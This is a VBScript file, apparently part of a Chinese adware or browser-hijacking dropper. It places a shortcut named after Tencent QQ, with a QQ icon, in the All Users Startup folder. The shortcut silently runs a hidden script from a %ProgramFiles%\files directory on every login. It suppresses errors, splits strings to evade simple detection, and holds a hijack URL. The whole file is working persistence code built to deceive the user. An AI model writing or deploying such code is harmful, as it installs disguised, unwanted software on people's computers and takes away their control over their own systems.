Rem "600701663" 
on error resume next 
Dim url
url = "http://www.haoha123.com/?kk"
if url = "#"&"URL"&"#" then
 url="http://www.haoha123.com/?kk"
end if

Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'特殊文件夹“桌面”
Favorites = WshShell.SpecialFolders("Favorites") :'特殊文件夹“桌面”
 
strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
dim direct
direct= strttWinDir & "\files"

iescc=strttWinDir&"\Internet Explorer\iexplore.exe"
ssd="粘贴"
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")


CopyPath=WSHShell.ExpandEnvironmentStrings("%SystemRoot%") & "\" '获取
ScriptEx=CopyPath & "System32\WScript.exe"
Rem "#REM#" 

pathname = WshShell.SpecialFolders("AllUsersStartMenu") +"\程"&"序\启"&"动\" 
Set oShellLink = WshShell.CreateShortcut(pathname+"腾"&"讯"&"QQ.lnk")
oShellLink.Arguments = "/e:vbs " & "q"
oShellLink.TargetPath = ScriptEx : '目标
oShellLink.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink.IconLocation = "%ProgramFiles%\files\qq.ico, 0" : '图标

Rem 600701663

oShellLink.WorkingDirectory = "%ProgramFiles%\files\" : '起始位置
oShellLink.Save : '创建保存快捷方式

WScript.quit